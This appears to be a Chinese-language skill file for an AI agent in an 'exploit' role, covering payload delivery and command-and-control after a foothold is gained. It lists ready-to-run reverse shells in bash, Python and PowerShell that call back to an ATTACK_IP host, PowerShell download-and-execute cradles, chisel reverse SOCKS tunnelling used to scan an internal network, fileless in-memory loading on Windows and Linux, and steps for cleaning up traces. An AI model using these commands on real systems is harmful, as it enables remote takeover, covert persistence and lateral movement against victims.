---
name: payload-c2
description: 载荷生成、落地、隧道与 C2 选择：反弹 shell 族、内存加载、隧道工具对比、隐蔽与清理
whenToUse: 已确认命令执行或文件写入，需要稳定回连通道或横向跳板
role: exploit
enabled: true
---

# 载荷与通道

## 反弹 shell 速查

```bash
bash -i >& /dev/tcp/ATTACK_IP/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACK_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACK_IP/a.ps1')"
# 编码后落地（避免引号问题）
powershell -e BASE64_UTF16LE
```

## 通道选择

| 场景 | 工具 | 说明 |
|---|---|---|
| HTTP 出网、要隐蔽 | suo5 | 内存马式隧道，流量像正常 HTTP |
| 只有正向端口 | frpc/frps | 需要一台公网 VPS 或已控跳板 |
| 严格出网、需 SOCKS | chisel | 单文件，client/server 两段 |
| 内网横向 | impacket-wmiexec / smbexec | 不落盘，靠 SMB |
| 无文件执行 | WMI / WinRM / PSRemoting | 5985/5986 |

```bash
# chisel 反向 SOCKS
./chisel server -p 8080 --reverse
./chisel client ATTACK_IP:8080 R:socks
# 之后 proxychains 直接打内网
proxychains4 -f proxy.conf nmap -sT -Pn 10.0.0.0/24
```

## 内存加载（不落盘）

```powershell
# .NET 程序集反射加载
$b=[IO.File]::ReadAllBytes("C:\temp\tool.exe");[Reflection.Assembly]::Load($b)
# 远程
IEX (IWR -UseBasicParsing http://ATTACK_IP/x.ps1)
```

```bash
# Linux memfd 无文件
python3 -c 'import os,ctypes,base64;fd=os.memfd_create("x");os.write(fd,base64.b64decode("B64"));os.execve(f"/proc/self/fd/{fd}",["x"],{})'
```

## 收尾

```
1. 落地文件清单（路径 + 哈希），退出前逐条删除
2. 计划任务 / 服务 / 注册表 Run 键：改过的都列出来
3. 不要留明文凭据在目标上（历史命令、脚本、日志）
4. 会话保持优先用合法通道（已有凭据的 SSH/WinRM），少用自建后门
```

## 判据

- 通道建立 = 从目标侧主动发起的回连在 ATTACK_IP 上收到，且能双向执行命令
- 记录：命令原文、回连时间、会话 id、可用权限、清理状态
